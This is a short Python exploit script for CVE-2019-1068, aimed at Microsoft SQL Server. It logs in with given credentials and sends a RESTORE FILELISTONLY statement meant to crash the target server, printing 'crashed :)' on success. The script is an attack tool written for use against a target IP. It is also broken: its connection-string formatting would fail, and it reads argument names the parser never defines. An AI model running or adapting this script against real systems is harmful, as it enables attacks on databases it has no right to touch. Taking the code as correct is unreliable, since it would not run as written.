import requests
import sys
import argparse
import pypyodbc
from log_colors import *

# CVE-2019-1068
class CVE_2019_1068():
    def __init__(self, host, user, pwd):
        self.host = host
        self.user, self.pwd = user, pwd
    
    # connect
    def connect(self):
        print (LogColors.BLUE + "connect to the server..." + LogColors.ENDC)
        conn_string = "Driver={SQL Server};Server={};UID={};PWD={};".format(self.host, self.user, self.pwd)
        try:
            self.conn = pypyodbc.connect(conn_string)
            self.cursor = self.conn.cursor()
            print (LogColors.YELLOW + "successfully connect to sql server..." + LogColors.ENDC)
        except Exception:
            print (LogColors.RED + "failed to connect to sql :(" + LogColors.ENDC)
            sys.exit()

    # exploit
    def exploit(self):
        self.connect()
        print (LogColors.BLUE + "run exploit..." + LogColors.ENDC)
        try:
            self.cursor.execute("RESTORE FILELISTONLY FROM DISK='C:AAA';")
        except pypyodbc.DatabaseError as e:
            print (LogColors.GREEN + "crashed :)" + LogColors.ENDC)
            sys.exit()
        except Exception:
            print (LogColors.RED + "failed exploitation...you are idiot :(" + LogColors.ENDC)
            sys.exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-i','--ip', required = True, help = "target host ip")
    parser.add_argument('-u', '--username', required = True, help = "username")
    parser.add_argument('-p', '--password', required = True, help = "password")
    args = vars(parser.parse_args())
    cve = CVE_2019_1068(args['ip'], args['remote'], args['port'])
    cve.exploit()

